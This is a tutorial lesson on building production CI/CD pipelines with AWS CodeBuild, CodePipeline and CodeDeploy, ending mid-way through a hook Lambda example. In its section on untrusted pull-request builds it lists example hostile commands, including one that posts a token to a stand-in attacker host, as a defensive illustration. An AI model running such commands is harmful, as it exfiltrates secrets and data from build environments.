# AWS Masterclass — Phase 3

# Lesson 46: AWS CodeBuild, CodePipeline and CodeDeploy Production CI/CD

## 1. Lesson objectives

By the end of this lesson, you will understand how to:

* Build secure and repeatable CI/CD pipelines on AWS.
* Distinguish CodeBuild, CodePipeline and CodeDeploy responsibilities.
* Create version-controlled `buildspec.yml` files.
* Build and push immutable container images to Amazon ECR.
* Generate test reports, deployment artifacts and pipeline variables.
* Choose CodeBuild on-demand, Lambda or reserved-capacity compute.
* Run builds inside a VPC securely.
* Protect build environments from untrusted code.
* Choose CodePipeline V1 or V2.
* Understand superseded, queued and parallel pipeline execution.
* Trigger pipelines through branch, tag, file-path and pull-request events.
* Add automated tests, security gates and manual approvals.
* Encrypt pipeline artifacts using S3 and KMS.
* Deploy across AWS accounts and Regions.
* Use CodeDeploy for EC2, Lambda and ECS deployment workflows.
* Implement ECS blue/green, canary and linear traffic shifting.
* Use lifecycle hooks and CloudWatch alarms for deployment validation.
* Configure automatic rollback.
* Provision CI/CD resources using Terraform.
* Troubleshoot build, pipeline and deployment failures.

---

# 2. CI/CD mental model

## Continuous integration

Continuous integration answers:

```text
Does this change build, test and satisfy engineering policy?
```

Flow:

```text
Developer commit
      |
      v
Source repository
      |
      v
Compile or package
      |
      v
Unit tests
      |
      v
Security checks
      |
      v
Immutable artifact
```

## Continuous delivery

Continuous delivery answers:

```text
Is this tested artifact ready to be released?
```

The artifact reaches a deployable state, but production release may require approval.

## Continuous deployment

Continuous deployment answers:

```text
Can every approved change automatically reach production?
```

Flow:

```text
Commit
  |
  v
Build
  |
  v
Test
  |
  v
Security gates
  |
  v
Deploy staging
  |
  v
Validate
  |
  v
Deploy production
```

---

# 3. The three-service mental model

```text
AWS CodeBuild
    = Build and test

AWS CodePipeline
    = Orchestrate stages and actions

AWS CodeDeploy
    = Control application deployment
```

Architecture:

```text
Source repository
      |
      v
CodePipeline
      |
      ├── CodeBuild
      |      ├── Test
      |      ├── Package
      |      └── Build container
      |
      ├── Approval and policy gates
      |
      └── CodeDeploy
             ├── EC2
             ├── Lambda
             └── ECS blue/green
```

CodeBuild runs build instructions inside managed environments, CodePipeline moves revisions and artifacts through ordered stages, and CodeDeploy manages supported application deployment lifecycles. ([AWS Documentation][1])

## One-line memory trick

```text
CodeBuild creates.
CodePipeline coordinates.
CodeDeploy releases.
```

---

# 4. Production pipeline principles

A production pipeline should follow these principles:

```text
Build once
Test the exact artifact
Promote without rebuilding
Use temporary credentials
Keep environments separate
Deploy gradually
Validate automatically
Roll back automatically
Record every decision
```

The production artifact should be traceable to:

```text
Source commit
+
Build execution
+
Test results
+
Artifact digest
+
Approval
+
Deployment execution
```

---

# 5. AWS CodeBuild

AWS CodeBuild is a managed build service.

A build project defines:

* Where source code comes from.
* Which build image is used.
* The compute environment.
* The service role.
* Environment variables and secrets.
* VPC configuration.
* Build commands.
* Cache configuration.
* Logs, reports and output artifacts.

CodeBuild downloads the input source into a build environment and follows the project configuration and build specification to produce results and artifacts. ([AWS Documentation][1])

```text
Source
  |
  v
CodeBuild project
  |
  v
Temporary build environment
  |
  ├── Install dependencies
  ├── Test
  ├── Scan
  ├── Compile
  ├── Build image
  └── Produce artifact
```

---

# 6. Build project versus build execution

## Build project

The reusable configuration:

```text
Project:
todo-api-build
```

It defines the environment and permissions.

## Build execution

One specific run:

```text
Build ID:
todo-api-build:8f62...
```

Each commit may create a separate build execution.

```text
One project
├── Build 101
├── Build 102
├── Build 103
└── Build 104
```

---

# 7. CodeBuild environment

The environment includes:

```text
Operating-system image
Runtime tools
CPU
Memory
Temporary disk
Environment variables
IAM service-role credentials
Source checkout
Build commands
```

CodeBuild supports AWS-managed images and custom build images from registries such as ECR. Compute options include EC2-based on-demand capacity, reserved-capacity fleets and Lambda compute for eligible workloads. ([AWS Documentation][2])

---

# 8. Build specification

A build specification is usually stored as:

```text
buildspec.yml
```

inside the source repository.

Main phases:

```text
install
pre_build
build
post_build
```

A `finally` block can also run after a phase whether its main commands succeed or fail. Build specifications can define variables, reports, artifacts, caches and batch-build behavior. ([AWS Documentation][3])

---

# 9. Basic `buildspec.yml`

```yaml
version: 0.2

phases:
  install:
    runtime-versions:
      nodejs: 22

    commands:
      - echo "Installing dependencies"
      - npm ci

  pre_build:
    commands:
      - echo "Running quality checks"
      - npm run lint
      - npm test

  build:
    commands:
      - echo "Building application"
      - npm run build

  post_build:
    commands:
      - echo "Build completed"

artifacts:
  files:
    - "dist/**/*"
```

Version `0.2` keeps commands in a shared shell environment within a phase, making variable changes and directory changes available to later commands in that phase.

---

# 10. Production shell behavior

Use strict shell handling:

```yaml
phases:
  build:
    commands:
      - |
        set -euo pipefail

        npm run build
        npm test
```

Meaning:

```text
-e:
Stop when a command fails.

-u:
Fail when an undefined variable is used.

-o pipefail:
A pipeline fails if any command in it fails.
```

Without `pipefail`, this can appear successful:

```bash
security-scan | tee results.txt
```

even when `security-scan` fails.

---

# 11. `finally` blocks

Example:

```yaml
phases:
  build:
    commands:
      - npm test

    finally:
      - echo "Collecting diagnostics"
      - cp -r logs/ "${CODEBUILD_SRC_DIR}/collected-logs/" || true
```

Use `finally` for:

* Diagnostic collection.
* Test-result collection.
* Cleanup.
* Environment summaries.
* Debug metadata.

Do not mask the original failure unintentionally.

---

# 12. CodeBuild environment variables

Variables can come from:

```text
Plain project configuration
Buildspec variables
CodePipeline
Parameter Store
Secrets Manager
Runtime-generated values
```

Example:

```yaml
env:
  variables:
    NODE_ENV: test

  parameter-store:
    NPM_REGISTRY_URL: /build/todo/npm-registry

  secrets-manager:
    PRIVATE_NPM_TOKEN: build/todo/npm-token
```

AWS advises against storing credentials or access keys in plaintext CodeBuild environment variables and recommends Parameter Store or Secrets Manager for sensitive values. ([AWS Documentation][4])

---

# 13. Do not print secrets

Bad:

```bash
env
```

This may print:

* Tokens.
* Passwords.
* Private repository credentials.
* Database connection strings.
* Deployment role details.

Better:

```bash
printenv | grep -E '^(AWS_REGION|CODEBUILD_BUILD_ID|CODEBUILD_RESOLVED_SOURCE_VERSION)='
```

Never enable unrestricted shell tracing with secrets:

```bash
set -x
```

unless every secret-bearing command is carefully excluded.

---

# 14. CodeBuild service role

CodeBuild assumes a service role to interact with AWS resources.

```text
CodeBuild environment
      |
      | Temporary credentials
      v
CodeBuild service role
      |
      ├── Read source artifact
      ├── Write output artifact
      ├── Push ECR image
      ├── Write logs
      └── Read approved secrets
```

The role should contain only permissions required by that build project. CodeBuild requires a service role to access dependent AWS resources on behalf of a build. ([AWS Documentation][5])

---

# 15. Separate build roles by responsibility

Bad:

```text
One CodeBuild role:
AdministratorAccess
```

Better:

```text
todo-api-test role:
Read source
Write logs
Publish test reports

todo-api-image-build role:
Read source
Push candidate ECR image
Read build-only secrets

todo-api-promotion role:
Read candidate image
Write production image
Sign artifact
```

Separation reduces the impact of:

* Malicious build scripts.
* Dependency compromise.
* Accidental commands.
* Pull-request builds from untrusted branches.

---

# 16. Privileged mode

Traditional Docker-in-Docker builds often require CodeBuild privileged mode.

```text
CodeBuild container
      |
      v
Docker daemon
      |
      v
Build application image
```

Privileged mode gives the build environment elevated access to Docker capabilities and increases security risk. AWS security controls recommend keeping it disabled unless the build genuinely needs it. Docker layer caching also requires privileged Linux builds. ([AWS Documentation][6])

Use privileged mode only for projects that build containers.

Do not enable it on ordinary:

* Unit-test projects.
* Lint projects.
* Terraform validation projects.
* Documentation builds.

---

# 17. Untrusted pull-request builds

Treat pull-request code as untrusted.

A malicious change could add:

```bash
aws s3 cp s3://sensitive-bucket/data .
aws secretsmanager list-secrets
curl --data "$TOKEN" attacker.example
```

Protect pull-request builds by:

* Using a low-privilege service role.
* Not granting production deployment permissions.
* Not exposing production secrets.
* Not running privileged mode unless unavoidable.
* Restricting webhook sources.
* Using isolated repositories and environments.
* Requiring review before privileged build stages.

Public builds can expose logs, source or artifacts and should not be used for sensitive projects without careful controls. ([AWS Documentation][7])

---

# 18. CodeBuild compute options

## EC2 on-demand

Suitable for:

* General builds.
* Docker image builds.
* Large toolchains.
* Long tests.
* VPC access.
* Custom images.

You select a supported compute size, and CodeBuild provisions capacity for the build. ([AWS Documentation][2])

## Lambda compute

Suitable for eligible short builds that benefit from low startup latency and automatic concurrency.

Lambda compute has workload limitations; use EC2 compute when the required runtime or build operation is unsupported. ([AWS Documentation][8])

## Reserved-capacity fleets

Suitable when:

* Build demand is predictable.
* Startup latency matters.
* Builds run frequently.
* Dedicated build capacity is required.
* Custom instance characteristics are needed.

Reserved fleet machines remain provisioned and incur cost while available, including when idle. ([AWS Documentation][9])

---

# 19. Choosing CodeBuild compute

```text
Fast short lint/test build?
    → Evaluate Lambda compute.

General compilation or Docker build?
    → EC2 on-demand.

Constant high build volume?
    → Evaluate reserved-capacity fleet.

GPU compilation or testing?
    → Supported GPU compute environment.

ARM application?
    → ARM build environment.
```

Always measure:

* Queue time.
* Startup time.
* Build time.
* Cache effectiveness.
* Monthly cost.
* Parallel-build demand.

---

# 20. CodeBuild inside a VPC

A CodeBuild project can attach network interfaces to selected VPC subnets.

```text
CodeBuild build
      |
      v
Private subnets
      |
      ├── Private database
      ├── Internal API
      ├── Self-hosted repository
      └── Internal package registry
```

VPC builds require appropriate subnet routing, security groups, DNS and CodeBuild service-role permissions for the required network-interface operations. Internet or public service access must be provided through NAT or suitable VPC endpoints. ([AWS Documentation][10])

---

# 21. VPC build architecture

```text
CodeBuild
   |
   v
Private subnet
   |
   ├── Internal integration-test service
   |
   ├── VPC endpoints
   |      ├── S3
   |      ├── ECR
   |      ├── CloudWatch Logs
   |      ├── Secrets Manager
   |      └── STS
   |
   └── NAT gateway
          |
          v
      GitHub/npm/internet dependencies
```

A build placed in a private subnet does not automatically receive internet connectivity.

---

# 22. Build caching

CodeBuild supports:

```text
Amazon S3 cache
Local cache
```

S3 cache can be shared across build hosts and projects. Local cache stays on a particular build host and can use source, Docker-layer or custom cache modes. ([AWS Documentation][11])

## S3 cache

Good for:

* NPM dependencies.
* Maven dependencies.
* Gradle dependencies.
* Python wheels.
* Reusable generated files.

## Local cache

Good for:

* Large Git source metadata.
* Docker layers.
* Large intermediate build content.
* Frequent builds likely to reuse the same host.

---

# 23. Cache keys

Do not use one permanent cache for every dependency version.

Example:

```yaml
cache:
  key: "npm-$(codebuild-hash-files package-lock.json)"

  paths:
    - "/root/.npm/**/*"
```

When `package-lock.json` changes:

```text
Cache key changes
      |
      v
New cache created
```

This prevents stale dependencies from contaminating a build.

---

# 24. Cache is not an artifact

```text
Cache:
Speeds up builds.
May disappear.
May be stale.
Is not a release record.

Artifact:
The controlled output intended for later stages.
Must be traceable.
```

Never deploy directly from an unvalidated cache location.

---

# 25. Test reports

CodeBuild can collect test and code-coverage report files into report groups.

Supported workflows include common formats such as:

* JUnit XML.
* Cucumber.
* TestNG.
* Visual Studio TRX.
* Coverage formats.

CodeBuild report groups retain test reports for a limited period; raw files can be exported to S3 for longer retention. ([AWS Documentation][12])

Example:

```yaml
reports:
  TodoApiUnitTests:
    files:
      - "junit.xml"

    base-directory: "test-results"

    file-format: JUNITXML
```

---

# 26. Build artifacts

A CodeBuild project can produce:

```text
Primary artifact
Secondary artifacts
CodePipeline output artifacts
S3 artifacts
```

Example:

```yaml
artifacts:
  files:
    - "taskdef.json"
    - "appspec.yaml"
    - "imageDetail.json"

secondary-artifacts:
  test-evidence:
    files:
      - "test-results/**/*"
      - "coverage/**/*"
```

When CodeBuild is used by CodePipeline, the action’s configured output artifact names must match the artifact identifiers defined by the build. ([AWS Documentation][13])

---

# 27. Exported variables

CodeBuild can export selected environment variables to later CodePipeline actions.

Example:

```yaml
env:
  exported-variables:
    - IMAGE_DIGEST
    - IMAGE_URI
    - BUILD_VERSION
```

Later action reference:

```text
#{BuildVariables.IMAGE_DIGEST}
```

CodeBuild-exported variables are exposed as action output variables and can be consumed through CodePipeline namespaces. ([AWS Documentation][14])

Do not export secrets.

---

# 28. Batch builds

CodeBuild batch builds can run coordinated builds in parallel.

Use cases:

* Test sharding.
* Multiarchitecture builds.
* Matrix testing.
* Multiple runtime versions.
* Separate operating systems.
* Independent project modules.

```text
One batch request
├── Node.js 20 tests
├── Node.js 22 tests
├── ARM64 image
└── AMD64 image
```

Batch builds require a separate batch service role so the batch coordinator can start, stop and retry child builds without granting those powers to the ordinary build role. ([AWS Documentation][15])

---

# 29. CodeBuild production `buildspec.yml`

```yaml
version: 0.2

env:
  variables:
    AWS_REGION: ap-south-1
    ECR_REPOSITORY: candidate/todo-api
    CONTAINER_NAME: todo-api

  exported-variables:
    - IMAGE_URI
    - IMAGE_DIGEST
    - RELEASE_VERSION

phases:
  install:
    runtime-versions:
      nodejs: 22

    commands:
      - |
        set -euo pipefail

        node --version
        npm --version
        docker --version
        aws --version

  pre_build:
    commands:
      - |
        set -euo pipefail

        echo "Installing dependencies"
        npm ci

        echo "Running lint"
        npm run lint

        echo "Running tests"
        npm test -- --ci

        AWS_ACCOUNT_ID="$(
          aws sts get-caller-identity \
            --query Account \
            --output text
        )"

        ECR_REGISTRY="$(
          printf '%s.dkr.ecr.%s.amazonaws.com' \
            "$AWS_ACCOUNT_ID" \
            "$AWS_REGION"
        )"

        GIT_SHA="$(
          printf '%s' "$CODEBUILD_RESOLVED_SOURCE_VERSION" |
          cut -c1-12
        )"

        RELEASE_VERSION="git-${GIT_SHA}"
        IMAGE_URI="${ECR_REGISTRY}/${ECR_REPOSITORY}:${RELEASE_VERSION}"

        aws ecr get-login-password \
          --region "$AWS_REGION" |
        docker login \
          --username AWS \
          --password-stdin \
          "$ECR_REGISTRY"

  build:
    commands:
      - |
        set -euo pipefail

        docker build \
          --pull \
          --tag "$IMAGE_URI" \
          .

        docker push "$IMAGE_URI"

  post_build:
    commands:
      - |
        set -euo pipefail

        IMAGE_DIGEST="$(
          aws ecr describe-images \
            --repository-name "$ECR_REPOSITORY" \
            --image-ids imageTag="$RELEASE_VERSION" \
            --query 'imageDetails[0].imageDigest' \
            --output text \
            --region "$AWS_REGION"
        )"

        DEPLOY_IMAGE_URI="$(
          printf '%s@%s' \
            "${ECR_REGISTRY}/${ECR_REPOSITORY}" \
            "$IMAGE_DIGEST"
        )"

        printf '[{"name":"%s","imageUri":"%s"}]\n' \
          "$CONTAINER_NAME" \
          "$DEPLOY_IMAGE_URI" \
          > imagedefinitions.json

        printf '{"ImageURI":"%s"}\n' \
          "$DEPLOY_IMAGE_URI" \
          > imageDetail.json

        printf '%s\n' "$DEPLOY_IMAGE_URI" \
          > image-uri.txt

reports:
  TodoApiUnitTests:
    files:
      - "junit.xml"

    base-directory: "test-results"

    file-format: JUNITXML

artifacts:
  files:
    - imagedefinitions.json
    - imageDetail.json
    - image-uri.txt
    - taskdef.json
    - appspec.yaml
```

---

# 30. AWS CodePipeline

AWS CodePipeline orchestrates a sequence of stages and actions.

```text
Pipeline
├── Source stage
├── Build stage
├── Test stage
├── Staging deployment
├── Approval
└── Production deployment
```

A stage contains one or more actions. Actions in the same run order can operate in parallel, while later run-order actions wait for earlier ones to finish. Pipeline artifacts are copied through an S3 artifact store for actions to consume. ([AWS Documentation][16])

---

# 31. Pipeline components

```text
Pipeline
  |
  ├── Stage
  |     |
  |     ├── Action
  |     └── Action
  |
  ├── Artifact
  |
  ├── Variable
  |
  ├── Trigger
  |
  └── Condition
```

## Stage

A logical lifecycle phase.

## Action

One task, such as source retrieval, build, test, approval or deployment.

## Artifact

A ZIP-based file bundle transferred between actions.

## Variable

A dynamic value produced or consumed by actions.

## Trigger

A source event that starts the pipeline.

## Condition

Rules controlling stage entry, success, failure or rollback.

---

# 32. Recommended stages

```text
1. Source

2. Build

3. UnitTest

4. SecurityScan

5. PublishArtifact

6. DeployDevelopment

7. IntegrationTest

8. DeployStaging

9. PerformanceTest

10. ProductionApproval

11. DeployProduction

12. ProductionValidation
```

You do not need a separate service for every test, but the pipeline visualization should expose major release decisions clearly.

---

# 33. Actions in parallel

Example test stage:

```text
Test stage
├── Unit tests
├── Dependency scan
├── Container scan
├── Terraform validation
└── License policy
```

They can run in parallel if they do not depend on each other.

```text
Run order 1:
All five actions

Run order 2:
Aggregate quality decision
```

This reduces total pipeline duration while maintaining explicit quality gates.

---

# 34. CodePipeline V1 and V2

CodePipeline supports:

```text
V1 pipelines
V2 pipelines
```

V2 adds capabilities such as:

* Pipeline-level variables.
* Enhanced trigger configuration.
* Git-tag triggers.
* Branch and file-path filters.
* Pull-request triggers.
* Queued and parallel execution modes.
* Additional release-safety controls.

V2 features use the V2 pricing model, so including V2-only fields changes the pipeline type and associated cost behavior. ([AWS Documentation][17])

---

# 35. Pipeline execution modes

CodePipeline execution modes include:

```text
SUPERSEDED
QUEUED
PARALLEL
```

`QUEUED` and `PARALLEL` require a V2 pipeline. ([AWS Documentation][18])

---

# 36. Superseded mode

```text
Execution A starts
      |
      v
Execution B starts later
      |
      v
Older execution can be superseded
at locked stage boundaries
```

Use when:

* Only the newest source revision matters.
* Deploying an old commit after a newer commit is undesirable.
* Pipeline runs should converge on the latest revision.

Typical use:

```text
Development deployment pipeline
```

---

# 37. Queued mode

```text
Execution A
      |
      v
Execution B waits
      |
      v
Execution C waits
```

Use when:

* Every revision must run.
* Production releases must maintain order.
* Database migrations are sequential.
* Artifact promotion order matters.

Example:

```text
release-1.4.1
then
release-1.4.2
then
release-1.4.3
```

Queued execution prevents a later release from overtaking an earlier one.

---

# 38. Parallel mode

```text
Execution A ──────────>
Execution B ──────────>
Execution C ──────────>
```

Use when executions are independent, such as:

* Feature-environment deployments.
* Independent infrastructure stacks.
* Per-tenant deployment pipelines.
* Isolated test pipelines.

Be careful with shared environments:

```text
Execution A deploys production
while
Execution B deploys production
```

This can create race conditions.

Stage rollback conditions are not supported in the same way for `PARALLEL` pipelines, so choose the mode with rollback requirements in mind. ([AWS Documentation][19])

---

# 39. Source options

CodePipeline can integrate with sources such as:

* AWS CodeCommit.
* GitHub.
* GitHub Enterprise Server.
* GitLab.
* GitLab self-managed.
* Bitbucket Cloud.
* Amazon S3.
* Amazon ECR.

Third-party Git providers are generally integrated using AWS CodeConnections. ECR source actions can start when a new image is pushed and produce `imageDetail.json` as their output artifact. ([AWS Documentation][16])

## Current CodeCommit note

AWS CodeCommit returned to general availability for new customers on **November 24, 2025**. It can therefore be used by new accounts again, though GitHub, GitLab and Bitbucket remain common organisational choices. ([Amazon Web Services, Inc.][20])

---

# 40. Pipeline triggers

V2 pipelines can filter Git source events by:

* Branch names.
* Tag names.
* File paths.
* Pull-request events.
* Push events.

For example:

```text
Push to main:
Run delivery pipeline

Push tag release-*:
Run release pipeline

Change under terraform/**:
Run infrastructure pipeline

Pull request opened:
Run validation pipeline
```

Different filters inside one trigger have documented AND/OR behavior, so test the trigger configuration rather than assuming every combination works intuitively. ([AWS Documentation][21])

---

# 41. Monorepo trigger example

Repository:

```text
repo/
├── frontend/
├── backend/
├── terraform/
└── documentation/
```

Pipelines:

```text
Backend pipeline:
Trigger when backend/** changes

Frontend pipeline:
Trigger when frontend/** changes

Infrastructure pipeline:
Trigger when terraform/** changes
```

This avoids rebuilding every application for a documentation-only change.

---

# 42. Release-tag pipeline

Example:

```text
Developer creates:
release-1.4.2

CodePipeline V2 trigger:
refs/tags/release-*

Pipeline:
Build → Scan → Stage → Approve → Production
```

Git-tag triggers are supported for third-party source providers configured through connections. ([AWS Documentation][22])

Use protected tags and repository permissions so unauthorised users cannot trigger a production release.

---

# 43. Pipeline artifacts

CodePipeline uses an S3 artifact store.

```text
Source action
      |
      v
SourceArtifact.zip
      |
      v
CodeBuild action
      |
      v
BuildArtifact.zip
      |
      v
Deploy action
```

The artifact bucket should be:

* Private.
* Blocked from public access.
* Versioned where appropriate.
* Encrypted with KMS.
* Protected from deletion.
* Logged and monitored.
* Accessible only to pipeline and action roles.

Cross-Region pipelines require a separate artifact store definition for every Region containing an action. ([AWS Documentation][19])

---

# 44. Artifact encryption

Recommended:

```text
S3 artifact bucket
      |
      v
Customer-managed KMS key
```

The KMS key policy must allow:

* CodePipeline service role.
* CodeBuild service role.
* Cross-account action roles.
* Required deployment roles.

For cross-account pipelines, use a customer-managed KMS key because target-account roles must be granted explicit access to decrypt the artifact. ([AWS Documentation][23])

---

# 45. Artifact integrity

CodePipeline controls artifact movement, but production integrity should also record:

```text
Source commit
Artifact hash
Container digest
SBOM
Signature
Build ID
```

For container deployment:

```text
Source ZIP:
Used to build

Image digest:
Actual deployable artifact
```

Do not treat only the source commit as proof of what ran in production.

---

# 46. Pipeline variables

Variables can come from:

```text
Pipeline execution
Source action
CodeBuild exported variables
CloudFormation output
ECR source metadata
Built-in CodePipeline variables
```

Examples:

```text
#{codepipeline.PipelineExecutionId}
#{SourceVariables.CommitId}
#{BuildVariables.IMAGE_DIGEST}
#{variables.Environment}
```

Variables can dynamically configure later actions but must not be used as an unsecured secret store. ([AWS Documentation][24])

---

# 47. Manual approval

A manual approval action pauses the pipeline.

```text
Staging succeeds
      |
      v
Manual approval
      |
      ├── Approve → Production
      └── Reject  → Pipeline fails
```

Approval information can include:

* Release notes.
* Change ticket.
* Test report location.
* Monitoring dashboard.
* Artifact digest.
* Risk assessment.
* Rollback plan.

CodePipeline can send approval notifications through SNS. Historically, approval actions failed after seven days without a response; the action timeout is now configurable within the documented limits. ([AWS Documentation][25])

---

# 48. Approval is not a security gate by itself

Bad approval:

```text
Approver receives:
"Approve build 1042?"
```

Better:

```text
Release:
1.4.2

Commit:
a19f82c

Image digest:
sha256:ABC

Staging tests:
Passed

Critical findings:
0 unapproved

Change ticket:
CHG-104

Rollback:
task definition 41
```

Approval should be informed and auditable.

---

# 49. Least-privilege approvers

Separate:

```text
Pipeline editor:
Can change pipeline definition

Release approver:
Can approve production action

Pipeline execution role:
Can perform deployment

Developer:
Can commit source
```

Avoid allowing the same identity to:

```text
Change pipeline
Approve pipeline
Deploy pipeline
Change production monitoring
```

unless emergency access is specifically controlled.

Approval permission can be scoped to one pipeline, stage and approval action. ([AWS Documentation][26])

---

# 50. Stage conditions

CodePipeline stages can use conditions:

```text
Before entry
On failure
On success
```

Possible results include:

```text
Fail
Skip
Retry
Rollback
```

depending on condition type and configuration. Conditions can evaluate managed rules such as CloudWatch alarms, deployment windows, commands or Lambda-driven logic. ([AWS Documentation][27])

---

# 51. Entry condition

Example:

```text
Before entering production:

Check deployment window
      |
      ├── Within Saturday window → Enter stage
      └── Outside window         → Fail or skip
```

This prevents production release during:

* Business blackout.
* Peak transaction hours.
* Financial close.
* Major event periods.

---

# 52. On-success condition

A deployment action may technically succeed while application health deteriorates.

```text
Deploy stage succeeds
      |
      v
On-success condition checks:
5xx alarm
p95 latency
business failure metric
      |
      ├── Healthy → Continue
      └── Unhealthy → Rollback
```

This turns customer outcomes into release criteria.

---

# 53. Stage rollback

CodePipeline can roll a stage back manually or through configured stage conditions.

Rollback targets a previous successful execution that used the current pipeline structure version. ([AWS Documentation][28])

This means changing the pipeline structure may affect which earlier executions are eligible rollback targets.

Keep pipeline changes controlled and versioned.

---

# 54. Cross-Region actions

Example:

```text
Pipeline Region:
ap-south-1

Production deployment:
ap-south-1

DR deployment:
ap-southeast-1
```

CodePipeline needs an artifact store in each action Region:

```text
artifactStores:
├── ap-south-1 bucket and KMS key
└── ap-southeast-1 bucket and KMS key
```

CodePipeline copies required artifacts to the action Region before running the action. ([AWS Documentation][19])

---

# 55. Cross-account pipelines

Recommended environment model:

```text
Tools account
├── CodePipeline
├── CodeBuild
├── Artifact bucket
└── KMS key

Development account
└── Deployment role

Staging account
└── Deployment role

Production account
└── Deployment role
```

CodePipeline assumes an action role in the target account.

```text
Pipeline service role
      |
      | sts:AssumeRole
      v
Production deployment role
      |
      v
ECS / CodeDeploy / CloudFormation
```

Cross-account actions require coordinated artifact-bucket policies, KMS policies, source-account role permissions and target-account trust policies. ([AWS Documentation][23])

---

# 56. Cross-account trust policy

Production deployment role:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::111111111111:role/TodoAppCodePipelineRole"
      },
      "Action": "sts:AssumeRole",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-exampleorgid"
        }
      }
    }
  ]
}
```

Pipeline role:

```json
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::222222222222:role/TodoAppProductionDeployRole"
}
```

The production role should allow only the necessary deployment operations.

---

# 57. Prevent confused-deputy access

Use trust-policy controls such as:

* Exact source role ARN.
* Organisation ID.
* External ID where appropriate.
* Source account.
* Session tags.
* Restricted `iam:PassRole`.

Do not trust:

```text
arn:aws:iam::111111111111:root
```

without additional conditions when an exact deployment role can be used.

---

# 58. AWS CodeDeploy

CodeDeploy manages application deployment to supported compute platforms:

```text
EC2 and on-premises
AWS Lambda
Amazon ECS
```

It supports in-place deployment for EC2/on-premises and blue/green traffic-shifting models for ECS and Lambda. ([AWS Documentation][29])

```text
Application
    |
    v
Deployment group
    |
    v
Revision
    |
    v
Deployment configuration
    |
    v
Target compute
```

---

# 59. CodeDeploy components

## Application

Logical container for related deployment configuration.

## Deployment group

Defines:

* Target resources.
* Service role.
* Deployment strategy.
* Load balancer.
* Alarms.
* Rollback.
* Notifications.
* Traffic controls.

## Revision

The release content:

* S3 bundle.
* Git revision where supported.
* Lambda version.
* ECS task definition plus AppSpec and image information.

## Deployment configuration

Controls how traffic or instances transition to the new version.

---

# 60. CodeDeploy deployment types

## In-place deployment

```text
Existing instance
      |
      v
Stop old application
      |
      v
Install new application
      |
      v
Start application
```

Used primarily for EC2/on-premises.

Risks:

* Instance modified directly.
* Rollback requires redeployment.
* Partial-fleet versions during rollout.

## Blue/green deployment

```text
Blue environment:
Current version

Green environment:
New version
```

Traffic is shifted after validation.

Used for ECS, Lambda and supported EC2 scenarios.

---

# 61. Current ECS blue/green guidance

CodeDeploy-controlled ECS blue/green deployment remains supported and is widely used in existing CodePipeline implementations.

However, Amazon ECS now provides a native blue/green deployment controller with lifecycle hooks, canary and linear strategies. AWS documentation recommends native Amazon ECS blue/green deployment for newer ECS designs and provides a migration path from CodeDeploy-managed ECS blue/green. ([AWS Documentation][30])

Use CodeDeploy-based ECS blue/green when:

* An existing pipeline already relies on it.
* You need the established ECS-to-CodeDeploy CodePipeline action.
* Existing AppSpec and hook automation is mature.
* Migration has not yet been completed.

Evaluate ECS-native blue/green for new services.

---

# 62. CodeDeploy ECS blue/green architecture

```text
CodePipeline
      |
      v
CodeDeploy ECS deployment
      |
      v
Existing ECS service
      |
      ├── Blue task set
      |      └── Production target group
      |
      └── Green task set
             └── Replacement target group
```

Load balancer listeners:

```text
Production listener:
Customer traffic

Optional test listener:
Validation traffic to green
```

CodeDeploy creates a replacement ECS task set and reroutes traffic from the original task set according to the deployment configuration. ([AWS Documentation][31])

---

# 63. Required ECS blue/green resources

CodeDeploy-controlled ECS blue/green normally requires:

* ECS cluster.
* ECS service using CodeDeploy deployment controller.
* Task definition.
* ALB or NLB.
* Two target groups.
* Production listener.
* Optional test listener.
* CodeDeploy application.
* CodeDeploy deployment group.
* CodeDeploy service role.
* AppSpec file.
* Image-detail artifact.
* Optional lifecycle-hook Lambda functions.
* CloudWatch alarms.

---

# 64. AppSpec file for ECS

Example:

```yaml
version: 1

Resources:
  - TargetService:
      Type: AWS::ECS::Service

      Properties:
        TaskDefinition: <TASK_DEFINITION>

        LoadBalancerInfo:
          ContainerName: todo-api
          ContainerPort: 3002

        PlatformVersion: LATEST

        NetworkConfiguration:
          AwsvpcConfiguration:
            Subnets:
              - subnet-private-a
              - subnet-private-b
              - subnet-private-c

            SecurityGroups:
              - sg-todo-api

            AssignPublicIp: DISABLED

Hooks:
  - BeforeInstall: TodoAppBeforeInstall
  - AfterInstall: TodoAppAfterInstall
  - AfterAllowTestTraffic: TodoAppValidateTestTraffic
  - BeforeAllowTraffic: TodoAppBeforeProduction
  - AfterAllowTraffic: TodoAppValidateProduction
```

For an ECS deployment, the AppSpec identifies the replacement task definition, container name, container port, networking and optional validation hooks. The CodeDeploy agent is not installed on ECS tasks for this deployment model. ([AWS Documentation][32])

---

# 65. ECS lifecycle hooks

CodeDeploy ECS hooks include:

```text
BeforeInstall
AfterInstall
AfterAllowTestTraffic
BeforeAllowTraffic
AfterAllowTraffic
```

Each hook invokes a Lambda validation function identified in the AppSpec file. ([AWS Documentation][33])

---

# 66. Hook flow

```text
BeforeInstall
    |
    v
Green task set created
    |
    v
AfterInstall
    |
    v
Test traffic allowed
    |
    v
AfterAllowTestTraffic
    |
    v
BeforeAllowTraffic
    |
    v
Production traffic shifted
    |
    v
AfterAllowTraffic
```

A validation Lambda must report its lifecycle result to CodeDeploy.

```text
Succeeded:
Continue deployment

Failed:
Stop and roll back
```

---

# 67. Test-listener validation

Architecture:

```text
Validation Lambda
      |
      | Request test listener
      v
Green target group
      |
      v
New ECS task set
```

Tests can verify:

* Health endpoint.
* API contract.
* Database connectivity.
* Authentication.
* Read/write workflow.
* Version endpoint.
* Expected image digest.
* Critical business transaction.

CodeDeploy can run validation during `AfterAllowTestTraffic` before production traffic reaches the replacement tasks. ([AWS Documentation][34])

---

# 68. Hook Lambda example

```python
import os

import boto3
import urllib3

codedeploy = boto3.client("codedeploy")
http = urllib3.PoolManager()


def lambda_handler(event, context):
    deployment_id = event["DeploymentId"]
    lifecycle_event_hook_execution_id = (
        event["LifecycleEventHookExecutionId"]
    )

    status = "Failed"

    try:
        response = http.request(
            "GET",
            os.environ["TEST_URL"],
            timeout=urllib3.Timeout(connect=2.0, read=5.0),
            retries=False,
        )

        if response.status == 200:
            status = "Succeeded"

    finally:
        codedeploy.put_lifecycle_event_hook_execution_status(
            deploymentId=deployment_id,
            lifecycleEventHookExecutionId=(
